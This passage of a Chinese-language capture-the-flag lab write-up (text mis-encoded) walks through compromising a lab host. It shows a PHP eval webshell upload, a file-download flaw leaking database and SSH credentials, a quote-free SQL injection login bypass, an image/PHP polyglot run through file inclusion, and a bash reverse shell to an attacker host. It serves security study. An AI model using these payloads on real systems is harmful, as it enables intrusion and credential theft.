<p>çœ‹ä¸Šå»åªèƒ½ä¸Šä¼ ç…§ç‰‡ï¼Œå‰ç«¯æ²¡æœ‰ js æ£€æŸ¥ï¼Œåº”è¯¥æ˜¯åç«¯æ£€æŸ¥ï¼š</p>
<p>å°è¯•ä¸Šä¼ ä¸€ä¸ª php ä¸€å¥è¯æœ¨é©¬ <code>shell.php</code>ï¼Œç”¨ BurpSuite æŠ“åŒ…ä¸€ä¸‹ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span></pre></div></td><td class="code"><div><pre><span></span><code>POST /add HTTP/1.1
Host: 10.0.2.5
Content-Length: 609
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://10.0.2.5
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySAc3kUlEiXINjlY8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/add
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ivqiuu7jaq7egeeijdbacpn1r4
Connection: keep-alive

------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/x-php

&lt;?php eval($_POST['cmd']); ?&gt;

------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="name"

name
------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="address"

address
------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="id"

1337
------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="upload"

upload
------WebKitFormBoundarySAc3kUlEiXINjlY8--
</code></pre></div></td></tr></table></div>
<p>æŠŠ <code>application/octet-stream</code> ä¿®æ”¹ä¸º <code>image-jpeg</code> ï¼ˆåæ¥å‘ç°éƒ½ä¸éœ€è¦æ”¹ï¼‰ï¼Œä¸Šä¼ ä¸Šå»å‘ç° <strong>200 OK</strong> äº†ï¼Œä½†æ˜¯å¥½åƒä»€ä¹ˆå“åº”éƒ½æ²¡æœ‰ï¼Œ<code>/uploaded_images</code> ä¹Ÿæ²¡æœ‰å‡ºç°å†…å®¹ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰ç”¨ï¼ˆæˆ–è€…è¯´æ˜¯ä¸€ä¸ªç¼ºä¹å…·ä½“åº”ç”¨åœºæ™¯çš„ç©ºå£³ï¼‰</p>
<p><img alt="image-20251021111245151" src="../images/image-20251021111245151.png"/></p>
<h5 id="test">/test å­é¡µé¢</h5>
<p>é¡µé¢çš„å†…å®¹æ˜¯ï¼š</p>
<blockquote>
<p>'file' parameter is empty. Please provide file path in 'file' parameter</p>
</blockquote>
<p>ä¸€å¼€å§‹æˆ‘æ¨æµ‹è¿™é‡Œå¯ä»¥è¿è¡Œ <code>/add</code> ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°æ²¡æœ‰å®é™…ä¸Šä¼ ï¼Œäºæ˜¯æ¨æµ‹è¿™é‡Œå¯ä»¥è¿œç¨‹æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯ file å­—æ®µä¼¼ä¹å§‹ç»ˆä¸å¯ç”¨ï¼ŒBurpSuite æŠ“åŒ…ä¸€ä¸‹</p>
<p><img alt="image-20251021113852274" src="../images/image-20251021113852274.png"/></p>
<p>GET ä¸€ç›´æ²¡æœ‰ååº”ï¼ˆä¸åº”è¯¥ğŸ¤”ï¼Œä»¥åŠä¸ºä»€ä¹ˆæ˜¯ GETï¼‰ï¼Œè€ƒè™‘åˆ°ä¸€èˆ¬æ¥å‘æ–‡ä»¶éƒ½ä½¿ç”¨ POSTï¼Œæ”¹æˆ POST è¯•è¯•ï¼š</p>
<p><img alt="image-20251021114536140" src="../images/image-20251021114536140.png"/></p>
<p>ï¼ˆæŒºéœ‡æ’¼çš„ï¼‰</p>
<p>å‘ç°é€šè¿‡ <code>test.php</code> çš„è¿œç¨‹æ–‡ä»¶ä¸‹è½½å¯ä»¥è¿œç¨‹ä¸‹è½½å¤§å¤šæ•°æ–‡ä»¶ï¼ˆéœ€è¦ root è¯»æƒé™çš„ä¸è¡Œï¼‰ï¼Œä¸å¦‚ä» phpMyAdmin å…¥æ‰‹è·å–å†…å®¹</p>
<p>è¿™é‡Œæ”¾ä¸€æ®µ STFW çš„å†…å®¹ï¼š</p>
<blockquote>
<p>phpMyAdmin çš„é…ç½®æ–‡ä»¶ <em>config.inc.php</em> æ˜¯ç”¨äºè®¾ç½®æ•°æ®åº“è¿æ¥ã€å®‰å…¨é€‰é¡¹å’Œç•Œé¢åŠŸèƒ½çš„æ ¸å¿ƒæ–‡ä»¶</p>
<p>åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸­ï¼Œ<em>config.inc.php</em> æ–‡ä»¶çš„ä½ç½®å¯èƒ½æœ‰æ‰€ä¸åŒï¼š</p>
<ul>
<li><strong>Linux/Unix/macOS</strong>: <em>/etc/phpmyadmin/config.inc.php</em></li>
</ul>
</blockquote>
<p>å‘ç° File not foundï¼Œé‚è¯¢é—® AIï¼ŒAI ç»™äº†è§£ç­”</p>
<blockquote>
<p><strong>3. åœ¨ Web æœåŠ¡å™¨çš„æ–‡æ¡£æ ¹ç›®å½•å†… (é€šç”¨æƒ…å†µ)</strong></p>
<p>å½“ä½ <strong>æ‰‹åŠ¨ä¸‹è½½</strong> phpMyAdmin çš„å‹ç¼©åŒ…å¹¶è§£å‹åˆ°ä½ çš„ Web ç›®å½•ï¼ˆå¦‚ <code>/var/www/html</code>ï¼‰æ—¶ï¼Œé…ç½®æ–‡ä»¶å°±åœ¨ phpMyAdmin çš„æ ¹ç›®å½•é‡Œã€‚</p>
<ul>
<li><code>[ä½ çš„Webæ ¹ç›®å½•]/phpmyadmin/config.inc.php</code></li>
<li>ä¾‹å¦‚ï¼š<ul>
<li><code>/var/www/html/phpmyadmin/config.inc.php</code></li>
<li>...</li>
</ul>
</li>
</ul>
</blockquote>
<p>å°è¯•äº†è‹¥å¹²ä¸ªå¯èƒ½çš„æ–‡ä»¶ä½ç½®ï¼Œæœ€ç»ˆåœ¨ <code>/var/www/phpmy/config.inc.php</code> æˆåŠŸä¸‹è½½äº†æ–‡ä»¶</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;?php</span>

<span class="cm">/* Servers configuration */</span>
<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cm">/* Server: localhost [1] */</span>
<span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'verbose'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'port'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'socket'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'connect_type'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'tcp'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'extension'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'auth_type'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'cookie'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>           <span class="c1">// è´¦å·</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'roottoor'</span><span class="p">;</span>   <span class="c1">// å¯†ç </span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'AllowNoPassword'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>

<span class="cm">/* End of servers configuration */</span>

<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'DefaultLang'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'en-utf-8'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'ServerDefault'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'UploadDir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'SaveDir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>


<span class="cm">/* rajk - for blobstreaming */</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_garbage_threshold'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_repository_threshold'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'32M'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_temp_blob_timeout'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">600</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_temp_log_threshold'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'32M'</span><span class="p">;</span>


<span class="cp">?&gt;</span>
</code></pre></div></td></tr></table></div>
<p>åœ¨ phpMyAdmin ä¸Šç™»å½•å¤±è´¥ï¼Œè€ƒè™‘åˆ°è¿˜å¼€æ”¾äº† SSH æœåŠ¡ï¼Œäºæ˜¯åœ¨ SSH ä¸Šå°è¯•ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; ssh root@10.0.2.5
root@10.0.2.5's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Oct 21 17:43:30 IST 2025

  System load:  0.0               Processes:           78
  Usage of /:   12.1% of 9.61GB   Users logged in:     0
  Memory usage: 10%               IP address for eth0: 10.0.2.5
  Swap usage:   0%

// çœç•¥ä¸€äº›è¾“å‡º

root@indishell:~# 
</code></pre></div></td></tr></table></div>
<p><strong>å¾ˆç¥å¥‡åœ°è·å–äº† root æƒé™</strong>ï¼Œå‡ºäºå¯¹ phpMyAdmin çš„ç®¡ç†å‘˜è´¦æˆ·çš„å¥½å¥‡ï¼Œè·å–ä¸€ä¸‹è´¦å¯†</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code>root@indishell:~#<span class="w"> </span>cat<span class="w"> </span>/etc/mysql/debian.cnf
<span class="c1"># Automatically generated for Debian scripts. DO NOT TOUCH!</span>
<span class="o">[</span>client<span class="o">]</span>
<span class="nv">host</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>localhost
<span class="nv">user</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>debian-sys-maint
<span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Ypo4adDVx2Bzel79
<span class="nv">socket</span><span class="w">   </span><span class="o">=</span><span class="w"> </span>/var/run/mysqld/mysqld.sock
<span class="o">[</span>mysql_upgrade<span class="o">]</span>
<span class="nv">host</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>localhost
<span class="nv">user</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>debian-sys-maint
<span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Ypo4adDVx2Bzel79
<span class="nv">socket</span><span class="w">   </span><span class="o">=</span><span class="w"> </span>/var/run/mysqld/mysqld.sock
<span class="nv">basedir</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>/usr
</code></pre></div></td></tr></table></div>
<p>ä»¥ç®¡ç†å‘˜èº«ä»½è¿›å…¥äº† phpMyAdminï¼š</p>
<p><img alt="image-20251021122336065" src="../images/image-20251021122336065.png"/></p>
<p>ï¼ˆæƒé™ä¼¼ä¹æœ‰ç‚¹æ··ä¹±ï¼Œä¸ªäººè®¤ä¸º <code>root-roottoor</code> è´¦å¯†åº”è¯¥ç”¨äº php åå°ç™»å½•ï¼Œè€Œä¸æ˜¯ ssh ç™»å½•ï¼‰</p>
<h5 id="indexphp">/index.php æ ¹é¡µé¢</h5>
<p>æœ€å¸¸ç”¨çš„ä¸‡èƒ½å¯†ç ä¸èƒ½ä½¿ç”¨ï¼Œè€Œè¿™é‡Œåˆæœ‰ SQL æ³¨å…¥çš„æš—ç¤ºï¼Œè€ƒè™‘æ˜¯å±è”½äº†ä¸€äº› SQL è¯­å¥ç¬¦å·ï¼Œæ¯”å¦‚å•å¼•å· <code>'</code> </p>
<p>åœ¨ä¹‹å‰çš„æ“ä½œä¸­å·²ç»å¾—åˆ°äº†è¿œç¨‹æ–‡ä»¶ä¸‹è½½çš„èƒ½åŠ›ï¼Œä¸å¦¨å®¡è®¡ <code>index.php</code> çš„ä»£ç ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">// åªä¿ç•™äº†å…³é”®çš„éƒ¨åˆ†</span>
<span class="x">if(isset($_POST['login']))</span>
<span class="x">{       </span>
<span class="x">        // æŠŠè¾“å…¥ä¸­çš„å•å¼•å·åˆ æ‰äº†ï¼Œå”¯ä¸€çš„é˜²å¾¡ç‚¹</span>
<span class="x">        $uname=str_replace('\'','',urldecode($_POST['un']));</span>
<span class="x">        $pass=str_replace('\'','',urldecode($_POST['ps']));</span>
<span class="x">        $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';</span>
<span class="x">        $result = mysqli_query($conn, $run);</span>
<span class="x">if (mysqli_num_rows($result) &gt; 0) {</span>

<span class="x">$row = mysqli_fetch_assoc($result);</span>
<span class="x">           echo "You are allowed&lt;br&gt;";</span>
<span class="x">           $_SESSION['logged']=true;</span>
<span class="x">           $_SESSION['admin']=$row['username'];</span>

<span class="x">         header('Location: panel.php', true, 302);</span>

<span class="x">}</span>
<span class="x">else</span>
<span class="x">{</span>
<span class="x">        echo "&lt;script&gt;alert('Try again');&lt;/script&gt;";</span>
<span class="x">}</span>

<span class="x">}</span>
</code></pre></div></td></tr></table></div>
<p>å‘ç°ç¡®å®ä¼šåˆ é™¤è¾“å…¥ä¸­çš„å•å¼•å·ï¼ŒSTFW æ‰¾åˆ°ä¸€ä¸ªä¸ä½¿ç”¨å•å¼•å·çš„ payload <code>or 1=1 #" / =\</code></p>
<p>è´¦å·å¯†ç éƒ½è¾“å…¥ä»¥ä¸Š payload åæˆåŠŸç™»å½• panelï¼š</p>
<blockquote>
<p>åæ¥å‘ç°åœ¨è¿œç¨‹æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œå¯ä»¥ä¸‹è½½ <code>c.php</code>ï¼Œå†…å®¹ä¸­åŒ…å«äº†ä¸€ä¸ªä½æƒé™çš„ phpMyAdmin çš„è´¦å¯†ï¼Œç™»å½•åå¯ä»¥æŸ¥çœ‹ panel é¡µé¢çš„è´¦å¯†ï¼Œå°±ä¸éœ€è¦ SQL æ³¨å…¥äº†</p>
</blockquote>
<p><img alt="image-20251021132151591" src="../images/image-20251021132151591.png"/></p>
<p><img alt="image-20251021132253248" src="../images/image-20251021132253248.png"/></p>
<p>å‘ç° Add User ç•Œé¢ä½¿ç”¨çš„æ˜¯ /add é¡µé¢çš„æ¡†æ¶ï¼Œä¾æ—§æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ <code>shell.php</code> ï¼ŒæŠ“åŒ…æ”¹ <code>Content-Type: application/x-php</code> ä¸º <code>Content-Type: image/png</code>ï¼Œç»“æœæ˜¯ï¼š</p>
<blockquote>
<p>only png,jpg and gif file are allowed</p>
</blockquote>
<p>è€ƒè™‘ä¼ªè£…æ–‡ä»¶å¤´ï¼Œå°†ä¸€å¼ éšæ‰‹æˆªå±çš„ png å›¾ç‰‡å’Œ php ä»£ç æ‹¼æ¥ï¼Œä»¥ <code>.png</code> æ ¼å¼ä¸Šä¼ æˆåŠŸï¼ˆä¼¼ä¹ä¼šç¡¬æ£€æŸ¥åç¼€åï¼Œæ”¹ request ä¹Ÿæ— æ•ˆï¼‰</p>
<p><img alt="image-20251021141244303" src="../images/image-20251021141244303.png"/> </p>
<p>å†æ¬¡æ‰“å¼€ Add User ç•Œé¢æ—¶ä¸€å®šä¼šè¯»å–åˆšåˆšä¸Šä¼ çš„ç…§ç‰‡ï¼ŒæŠ“ä¸€ä¸‹åŒ…ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code>POST /panel.php HTTP/1.1
Host: 10.0.2.5
Content-Length: 27
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://10.0.2.5
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/panel.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hjsm15j6iifqf6i150hp28nim6
Connection: keep-alive

load=show&amp;continue=continue

// ä»¥åŠ response ä¸­è¢«ä¸Šä¼ çš„å›¾ç‰‡çš„ä½ç½®
// &lt;img src="uploaded_images/shell.png" height=90px width=100px&gt;
</code></pre></div></td></tr></table></div>
<p>æˆ‘ä»¬ä¿®æ”¹ <code>load=show</code> ä¸º <code>load=uploaded_images/shell.png</code>ï¼Œç„¶åç»å…¸çš„ <code>?cmd=ls</code> è¯•ä¸€è¯•</p>
<blockquote>
<p>åœ¨è¿™ä¸€æ­¥å¡äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œä¸»è¦æ˜¯ç†è§£ load å‚æ•°çš„ä½¿ç”¨ï¼ˆåˆ©ç”¨ä¹‹å‰çš„è¿œç¨‹æ–‡ä»¶è¯»å–ç¿» panel.php æ‰èƒ½ç†è§£è¿™ä¸ªå‚æ•°ï¼‰ï¼Œä»¥åŠå°è¯•ç›´æ¥åœ¨ panel.php æºå¸¦å‚æ•°ã€‚å¦å¤–ä¸€å¼€å§‹æˆ‘ä¸€ç›´å°è¯•ä¸Šä¼  .php åç¼€çš„æ–‡ä»¶å‘ç°æŸ¥çš„å¾ˆä¸¥ï¼ˆç™½åå•é™åˆ¶ï¼‰ï¼Œåœ¨ä¸Šä¼  .png æ–‡ä»¶çš„æ—¶å€™ä¹Ÿä¸ç¡®å®šå¯ä»¥æ‰§è¡Œ php éƒ¨åˆ†</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">if(isset($_POST['continue']))</span>
<span class="x">{</span>
<span class="x">  $dir=getcwd();</span>
<span class="x">  $choice=str_replace('./','',$_POST['load']);</span>
<span class="x">  </span>
<span class="x">  if($choice==='add')</span>
<span class="x">  {</span>
<span class="x">              include($dir.'/'.$choice.'.php');</span>
<span class="x">          die();</span>
<span class="x">  }</span>
<span class="x">  </span>
<span class="x">        if($choice==='show')</span>
<span class="x">  {</span>
<span class="x">        </span>
<span class="x">      include($dir.'/'.$choice.'.php');</span>
<span class="x">      die();</span>
<span class="x">  }</span>
<span class="x">  else</span>
<span class="x">  {</span>
<span class="x">      include($dir.'/'.$_POST['load']);   // è¿™é‡Œæœ‰æ‰§è¡Œä¸€å¥è¯æœ¨é©¬çš„æ¡ä»¶</span>
<span class="x">  }</span>
<span class="x">  </span>
<span class="x">}</span>
</code></pre></div></td></tr></table></div>
</blockquote>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code>POST /panel.php?cmd=ls HTTP/1.1
Host: 10.0.2.5
Content-Length: 49
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://10.0.2.5
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/panel.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hjsm15j6iifqf6i150hp28nim6
Connection: keep-alive

// è¿™é‡Œæ˜¯æˆ‘æ¢äº†ä¸ªå›¾ç‰‡é©¬ï¼Œæ‰€ä»¥åå­—ä¸ä¸€æ ·
load=uploaded_images/shell2.jpg&amp;continue=continue
</code></pre></div></td></tr></table></div>
<p>å‘ç° response ä¸­çœŸçš„æ‰§è¡Œäº† <code>ls</code> æŒ‡ä»¤ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ Getshellï¼ŒæŠŠ cmd å‚æ•°è®¾ç½®ä¸º <code>cmd=bash+-c+"bash+-i+&gt;%26+/dev/tcp/10.0.2.3/1234+0&gt;%261"</code> ï¼ˆè·å–åå‘ Shell çš„æŒ‡ä»¤è¿›è¡Œ URL ç¼–ç ï¼‰</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">1234</span><span class="w"> </span>
listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">1234</span><span class="w"> </span>...
<span class="m">10</span>.0.2.5:<span class="w"> </span>inverse<span class="w"> </span>host<span class="w"> </span>lookup<span class="w"> </span>failed:<span class="w"> </span>Unknown<span class="w"> </span>host
connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.3<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.5<span class="o">]</span><span class="w"> </span><span class="m">45714</span>
bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
www-data@indishell:/var/www$
</code></pre></div></td></tr></table></div>
<p>æˆåŠŸè·å¾—äº† www-data ä½æƒé™ç”¨æˆ·ï¼Œè¿™é‡Œæˆ‘è€ƒè™‘æ¢ä¸€ç§ææƒæ–¹å¼ï¼šå†…æ ¸ææƒ</p>
<blockquote>
